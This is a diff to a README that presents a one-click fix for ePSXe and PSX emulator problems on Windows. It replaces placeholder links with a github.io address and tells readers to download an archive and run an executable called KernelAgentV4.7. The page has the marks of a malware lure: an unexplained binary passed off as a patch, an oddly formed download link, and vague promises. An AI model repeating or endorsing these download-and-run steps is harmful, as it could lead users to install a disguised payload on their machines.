@@ -2,13 +2,15 @@
 
 Fix plugin errors, black screens, and improve ePSXe or PSX emulator performance on Windows with one-click patching via `KernelAgentV4.7`.
 
-[![Download Emulator Fix](https://img.shields.io/badge/Download-PSX_Emulator_Optimizer-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Emulator Fix](https://img.shields.io/badge/Download-PSX_Emulator_Optimizer-blueviolet)](https://epsxe-psx-emulator-optimizer-windows.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://epsxe-psx-emulator-optimizer-windows.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\ePSXeFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The patch will auto-fix video/audio/plugin configs and controller bindings  
